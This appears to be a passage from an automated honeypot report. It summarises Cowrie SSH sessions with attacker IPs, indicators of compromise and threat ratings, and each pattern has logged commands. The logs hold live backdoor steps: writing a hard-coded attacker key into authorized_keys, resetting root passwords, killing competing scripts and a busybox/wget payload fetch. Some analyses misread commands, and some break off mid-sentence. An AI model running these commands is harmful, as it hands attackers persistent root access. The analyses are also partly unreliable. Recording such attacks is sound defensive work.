cat /proc/cpuinfo | grep name | wc -l
echo -e "123\nkSoxoEapkPk6\nkSoxoEapkPk6"|passwd|bash
Enter new UNIX password: 
Enter new UNIX password:
echo "123\nkSoxoEapkPk6\nkSoxoEapkPk6\n"|passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
... (+12 more)
```

---

### Pattern: 8dd584bc937a...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 172.191.157.64

#### Analysis

**Attack Type:** Backdoor installation / botnet recruitment  
**Objective:** Gain persistent remote access (SSH) and elevate privileges (root).  
**Techniques:**  
- Injected a public‑key into `~/.ssh/authorized_keys`  
- Changed root password via `chpasswd`  
- Cleared and recreated `.ssh` directory, set restrictive permissions  
- Attempted to kill suspicious processes (`secure.sh`, `auth.sh`, `sleep`)  
- Collected system information (CPU, memory, OS, crontab) for reconnaissance.  

**Indicators of Compromise (IOCs):**  
- Attacker IP: **172.191.157.64**  
- SSH key string: `"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw==`  
- File: `~/.ssh/authorized_keys`  

**Threat Level:** **High** – root password change and SSH key injection provide full system control.  

**Brief Summary:** The attacker injected an SSH public‑key, changed the root password, and performed reconnaissance to establish a persistent backdoor for potential botnet use.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:rNxfLTsCEJBJ"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
... (+10 more)
```

---

### Pattern: 51e4931616f7...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 101.47.49.133

#### Analysis

**1. Attack Type:**  
Backdoor installation / botnet recruitment – the attacker injects an SSH public key into the honeypot’s `authorized_keys` file, enabling future remote access.

**2. Objective:**  
Gain persistent SSH access to the target machine and gather system information (CPU, memory, OS details) for potential exploitation or further reconnaissance.

**3. Techniques & Tools:**
- **SSH Key Injection:** `mkdir .ssh`, `echo … > ~/.ssh/authorized_keys` with a hard‑coded RSA key.
- **Permission Manipulation:** `chmod -R go= ~/.ssh`.
- **System Reconnaissance:** `cat /proc/cpuinfo`, `free -m`, `uname`, `lscpu`, `df -h`, `top`, `crontab -l`, `w`, `whoami`.

**4. Indicators of Compromise (IOCs):**
- IP: 101.47.49.133  
- Public key string: `"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"`  
- File path: `~/.ssh/authorized_keys`  

**5. Threat Level:** Medium – the attacker has successfully installed a backdoor but lacks evidence of further exploitation or malicious payload execution.

**6. Summary:**  
The attacker injected a malicious SSH key into the honeypot’s authorized keys, enabling future remote access, and performed basic system reconnaissance to assess potential vulnerabilities.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo -e "123123\nis0STYizETg3\nis0STYizETg3"|passwd|bash
Enter new UNIX password: 
Enter new UNIX password:
echo "123123\nis0STYizETg3\nis0STYizETg3\n"|passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
... (+12 more)
```

---

### Pattern: 525da4b6a344...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 38.41.198.38

#### Analysis

**Attack Type:** Backdoor installation / credential compromise  
**Objective:** Gain remote access to the host via SSH and elevate privileges (root).  

**Techniques & Tools Used:**  
- Manipulation of `.ssh` directory (`chattr`, `lockr`, `rm`, `mkdir`)  
- Injection of an RSA public key into `authorized_keys`  
- Setting root password with `chpasswd`  
- Process termination (`pkill -9`) and denial of hosts (`echo > /etc/hosts.deny`).  
- System reconnaissance (CPU, memory, uptime, user info).  

**Indicators of Compromise (IOCs):**  
- Attacker IP: **38.41.198.38** (Brazil)  
- RSA public key string in `authorized_keys` (e.g., “ssh‑rsa AAAAB3NzaC1yc2EAAAABJQ…”)  
- File paths altered: `/tmp/secure.sh`, `/tmp/auth.sh`, `/etc/hosts.deny`.  

**Threat Level:** **High** – the attacker successfully installed a backdoor and escalated privileges.  

**Brief Summary:** The attacker injected an SSH key, changed the root password, and gathered system information to establish persistent remote access.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:flQ6f1ySihPv"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
... (+10 more)
```

---

### Pattern: b3643da9fac8...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 58.69.56.44

#### Analysis

**Attack Type:** Backdoor installation / credential injection  
**Objective:** Gain remote SSH access to the honeypot (or target) by adding an arbitrary public‑key to `authorized_keys`.  
**Techniques:**  
- Manipulation of `.ssh` directory (`chattr`, `lockr`, `rm`, `mkdir`) and permission changes (`chmod`).  
- Injection of a random RSA key into `authorized_keys`.  
- Password change attempts via `passwd` (likely unsuccessful).  
- System reconnaissance commands (`cpuinfo`, `free`, `ls`, `crontab`, `uname`, etc.).  

**Indicators of Compromise (IOCs):**  
- Attacker IP: **58.69.56.44** (Philippines)  
- Public key string in `/ssh/authorized_keys` (e.g., `ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr`)  
- File path `/ssh/authorized_keys`  

**Threat Level:** Medium – the attacker is attempting to establish a persistent backdoor; moderate sophistication but potential for unauthorized access.  

**Brief Summary:** The session shows an attacker injecting a random RSA key into the honeypot’s SSH authorized keys, attempting password changes, and collecting system information—indicative of a backdoor installation attempt.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo -e "123456\nTZvsdaZnQI8E\nTZvsdaZnQI8E"|passwd|bash
Enter new UNIX password: 
Enter new UNIX password:
echo "123456\nTZvsdaZnQI8E\nTZvsdaZnQI8E\n"|passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
... (+12 more)
```

---

### Pattern: 91770f1088b0...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 82.27.116.55

#### Analysis

**Attack Type:**  
Backdoor installation via SSH key injection with reconnaissance.

**Objective:**  
Gain remote SSH access to the system (possibly as root or another privileged account) and gather system information for future exploitation.

**Techniques & Tools Used:**
- `chattr -ia` / `lockr -ia` – set immutable attributes on `.ssh`.
- Removal of existing `.ssh`, creation of new directory, injection of malicious SSH key into `authorized_keys`.
- `passwd` command with scripted password input to attempt password change.
- System‑info commands (`cat /proc/cpuinfo`, `free`, `uname`, `whoami`, etc.) for reconnaissance.

**Indicators of Compromise (IOCs):**
- Attacker IP: **82.27.116.55

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo -e "ollama\nlQKgt468UTYV\nlQKgt468UTYV"|passwd|bash
Enter new UNIX password: 
Enter new UNIX password:
echo "ollama\nlQKgt468UTYV\nlQKgt468UTYV\n"|passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
... (+12 more)
```

---

### Pattern: fde1904ba860...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 150.95.84.172

#### Analysis

**Attack Type:**  
Backdoor installation / credential compromise (root privilege takeover)

**Objective:**  
Gain full administrative control of the system by installing an SSH key for remote access and resetting the root password.

**Techniques & Tools Used:**
- **SSH Key Injection** – `echo … > ~/.ssh/authorized_keys` to add a malicious RSA key.
- **Permission Manipulation** – `chmod -R go= ~/.ssh` to restrict access.
- **Root Password Reset** – `echo "root:pz2h3i2B8gT8"|chpasswd|bash`.
- **Process Termination & File Removal** – `pkill -9 …`, `rm -rf /tmp/...` to clean up potential payloads.
- **System Information Gathering** – various `proc/cpuinfo`, `free`, `uname`, `top`, etc. for reconnaissance.

**Indicators of Compromise (IOCs):**
- IP: 150.95.84.172  
- SSH Key: `ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr`  
- File names: `.ssh`, `authorized_keys`, `/tmp/secure.sh`, `/tmp/auth.sh`, `/etc/hosts.deny`.

**Threat Level:** High – attacker achieved root access and installed a persistent backdoor.

**Brief Summary:**  
The attacker injected an SSH key and reset the root password, effectively establishing a privileged backdoor on the honeypot.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:pz2h3i2B8gT8"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
... (+10 more)
```

---

### Pattern: 632a4fb080e9...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 119.203.251.187

#### Analysis

**Attack Type:** Backdoor installation via SSH key injection  
**Objective:** Gain persistent remote access to the system through SSH.  

**Techniques Used:**
- Manipulation of `.ssh` directory (`chattr`, `lockr`, `rm -rf`, `mkdir`) and permission changes (`chmod -R go=`).  
- Injection of a public RSA key into `authorized_keys`.  
- Attempts to set a new UNIX password via `passwd`.  

**Indicators of Compromise (IOCs):**
- Attacker IP: **119.203.251.187**  
- Public SSH key string: `"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"`  
- File names: `.ssh`, `authorized_keys`  

**Threat Level:** **High** – the attacker is attempting to establish a persistent backdoor with SSH access, which could allow unauthorized remote control.

**Brief Summary:** The session shows an attacker injecting an SSH public key into the system’s authorized keys and modifying permissions to enable remote login, while also attempting to change user passwords. This indicates a deliberate effort to create a backdoor for future exploitation.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo -e "aryan123\nNxOYnXrHPbA6\nNxOYnXrHPbA6"|passwd|bash
Enter new UNIX password: 
Enter new UNIX password:
echo "aryan123\nNxOYnXrHPbA6\nNxOYnXrHPbA6\n"|passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
... (+12 more)
```

---

### Pattern: 35ffe163ef1b...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 82.27.116.55

#### Analysis

**Attack Type:** Backdoor installation (SSH key injection) + reconnaissance  
**Objective:** Gain remote access via SSH and collect system details for future exploitation.  

**Techniques & Tools:**
- **SSH Key Injection** – created `.ssh/authorized_keys` with a public RSA key, altered permissions (`chmod -R go= ~/.ssh`).  
- **File locking** – used `lockr -ia .ssh` to prevent modifications.  
- **Password manipulation** – attempted to set passwords via `passwd` (multiple attempts).  
- **System reconnaissance** – executed commands like `cat /proc/cpuinfo`, `free -m`, `ls`, `crontab -l`, `uname`, `top`, `whoami`, `df`.

**Indicators of Compromise (IOCs):**
- IP: 82.27.116.55  
- RSA key string (public key in `.ssh/authorized_keys`).  
- Usage of `lockr` and `chattr`.  

**Threat Level:** Medium – moderate sophistication with potential for remote access.

**Brief Summary:** The attacker injected an SSH public key to establish a backdoor, attempted password changes, and collected system information for reconnaissance.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo -e "aryan123\nmaGBwCaLskP4\nmaGBwCaLskP4"|passwd|bash
Enter new UNIX password: 
Enter new UNIX password:
echo "aryan123\nmaGBwCaLskP4\nmaGBwCaLskP4\n"|passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
... (+12 more)
```

---

### Pattern: f06ec1846665...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 222.188.185.171

#### Analysis

**Attack Type:** Remote code execution / backdoor installation  
**Objective:** Deploy a malicious payload (likely a hidden executable) on the honeypot.  

**Techniques & Tools Used:**
- `tftp` and `wget` for downloading data.
- `busybox PEARB` – custom binary used to execute or manipulate files.
- `dd`, `cat`, `cp`, and shell commands to create, read, and delete a temporary file (`.s`) in `/dev/shm`.  
- Use of `while read i; do echo $i; done < .s` for processing the downloaded data.

**Indicators of Compromise (IOCs):**
- Attacker IP: **222.188.185.171** (China)
- File names: `.s`, `busybox PEARB`
- Commands involving `/proc/mounts`, `/dev/shm`, and temporary file handling.
- Potential payload URLs or binaries referenced via `tftp`/`wget` (not specified in logs).

**Threat Level:** **Medium** – moderate sophistication with a clear intent to install a backdoor, but limited scope and short session duration.

**Brief Summary:**  
The attacker used tftp/wget to download a hidden binary (`busybox PEARB`) and executed it via shell commands, creating a temporary file in `/dev/shm` before cleaning up. This indicates an attempt to install a backdoor on the system.

#### Sample Commands
```
enable
system
system
shell
shell
sh
cat /proc/mounts; /bin/busybox PEARB
cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox PEARB
tftp; wget; /bin/busybox PEARB
dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
... (+5 more)
```

---

### Pattern: f7dd3a2dba4e...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 101.47.142.211

#### Analysis

**Attack Type:** Backdoor / Remote Access Installation  
**Objective:** Gain SSH access to the host and potentially elevate privileges.  
**Techniques:**  
- Manipulated `~/.ssh` directory (removal, creation, permission changes).  
- Injected a public‑key into `authorized_keys`.  
- Attempted password change via `passwd` with echoed credentials.  
- Collected system information (`cpuinfo`, memory, disk usage, uname, etc.) for reconnaissance.  

**Indicators of Compromise (IOCs):**  
- Attacker IP: **101.47.142.211** (Singapore).  
- SSH key string: `"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw==`.  
- Password attempts: `"root123"` and `"fWk2iIGmN7XW"`.  

**Threat Level:** Medium – the attacker is attempting to establish a persistent backdoor, but success is uncertain.  

**Brief Summary:** The session shows an attempt to install an

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo -e "root123\nfWk2iIGmN7XW\nfWk2iIGmN7XW"|passwd|bash
Enter new UNIX password: 
Enter new UNIX password:
echo "root123\nfWk2iIGmN7XW\nfWk2iIGmN7XW\n"|passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
... (+10 more)
```

---

### Pattern: c5065779fc74...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 119.203.251.187

#### Analysis

**Attack Type:** Backdoor installation via SSH key injection (with additional reconnaissance)

**Objective:**  
- Create a persistent remote access point by injecting an SSH public key into the victim’s `authorized_keys` file.  
- Modify file permissions and attributes to conceal the injected key.  
- Attempt to change or set user passwords, possibly creating a new account for further exploitation.

**Techniques & Tools Used:**
- **SSH Key Injection:** `echo ... > .ssh/authorized_keys`
- **File Attribute Manipulation:** `chattr -ia`, `lockr -ia` (likely custom tool to lock attributes)
- **Password Modification:** `passwd` commands with new passwords (`ollama`, `pfd8e2Qao0Vr`)
- **System Reconnaissance:** CPU/memory info (`cat /proc/cpuinfo`, `free -m`, `lscpu`), user and system details (`whoami`, `uname`, `crontab -l`, `w`)

**Indicators of Compromise (IOCs):**
- Public SSH key string:  
  ```
  ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9i

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo -e "ollama\npfd8e2Qao0Vr\npfd8e2Qao0Vr"|passwd|bash
Enter new UNIX password: 
Enter new UNIX password:
echo "ollama\npfd8e2Qao0Vr\npfd8e2Qao0Vr\n"|passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
... (+12 more)
```

---

### Pattern: 178afb6eb10f...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 209.141.62.124

#### Analysis

**1. Attack Type:**  
Backdoor installation via SSH key injection combined with reconnaissance of system information.

**2. Objective:**  
The attacker aimed to gain persistent remote access by inserting a malicious SSH key into the host’s `authorized_keys` file, while collecting details about the machine (CPU, memory, OS, user accounts) and attempting to modify the default user password.

**3. Techniques & Tools Used:**
- **File manipulation & attribute locking:** `chattr -ia`, `lockr -ia` to hide and lock `.ssh`.
- **SSH key injection:** creation of a new `.ssh` directory, writing a malicious RSA key into `authorized_keys` with restrictive permissions (`chmod -R go= ~/.ssh`).
- **Password manipulation:** multiple `passwd` commands with hard‑coded passwords.
- **System reconnaissance:** `cat /proc/cpuinfo`, `free -m`, `ls`, `crontab -l`, `w`, `uname`, `top`, `whoami`, `lscpu`, `df`.

**4. Indicators of Compromise (IOCs):**
- Attacker IP: **209.141.62.124**  
- Malicious SSH key string:  
  ```
  ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnv

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo -e "123456\nOQKkovuknDtf\nOQKkovuknDtf"|passwd|bash
Enter new UNIX password: 
Enter new UNIX password:
echo "123456\nOQKkovuknDtf\nOQKkovuknDtf\n"|passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
... (+12 more)
```

---

### Pattern: 0134f5c474b4...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 150.95.84.172

#### Analysis

**Attack Type:**  
Backdoor installation with credential manipulation (SSH key injection) + reconnaissance

**Objective:**  
Gain remote access via SSH by adding a new public‑key to `authorized_keys`, attempt to change user passwords, and gather system information for further exploitation or profiling.

**Techniques & Tools:**
- `chattr -ia` / `lockr -ia` – lock files to prevent tampering
- `rm -rf .ssh && mkdir .ssh` – reset SSH directory
- `echo … > .ssh/authorized_keys` – inject RSA public key
- `chmod -R go= ~/.ssh` – restrict permissions
- `passwd` with echoed input – attempt password change
- System info commands: `cat /proc/cpuinfo`, `free -m`, `uname`, `lscpu`, `df -h`, `crontab -l`, `w`

**Indicators of Compromise (IOCs):**
- Attacker IP: **150.95.84.172** (Japan)
- RSA public key string in `authorized_keys` (unique fingerprint)
- File path: `.ssh/authorized_keys`
- Commands used: `chattr`, `lockr`, `passwd`

**Threat Level:** Medium–High  
The attacker successfully injected a SSH key and attempted to alter credentials, enabling potential remote control. The reconnaissance indicates intent to gather system details for further exploitation.

**Brief Summary:**  
An attacker from Japan inserted an SSH public key into the honeypot’s authorized_keys, tried to change user passwords, and performed extensive system reconnaissance, indicating a backdoor installation attempt with high potential impact.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo -e "123\npyMLd9V5lpaK\npyMLd9V5lpaK"|passwd|bash
Enter new UNIX password: 
Enter new UNIX password:
echo "123\npyMLd9V5lpaK\npyMLd9V5lpaK\n"|passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
... (+12 more)
```

---

### Pattern: dd368968b721...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 58.69.56.44

#### Analysis

**Attack Type:** Backdoor / SSH Key Injection  
**Objective:** Gain remote access to the host via an injected SSH key.  
**Techniques:**  
- `chattr -ia`, `lockr` to prevent modifications of `.ssh`.  
- Removal, recreation of `.ssh`, and injection of a hard‑coded RSA public key into `authorized_keys`.  
- Permission changes (`chmod -R go= ~/.ssh`) to restrict access.  
- System reconnaissance commands (CPU info, memory, disk usage, uname, etc.) to gather host details.  

**Indicators of Compromise (IOCs):**  
- Attacker IP: **58.69.56.44**  
- RSA public key string in the `authorized_keys` file:  
  ```
  ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr
  ```
- File path: `~/.ssh/authorized_keys`  
- Commands that modify `.ssh` permissions and attributes.  

**Threat Level:** **High** – the attacker successfully installed a persistent SSH backdoor, enabling future remote access with minimal detection.

**Brief Summary:** The attacker injected an RSA public key into the host’s SSH authorized keys, secured the directory against modifications, and collected system information to facilitate further exploitation.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
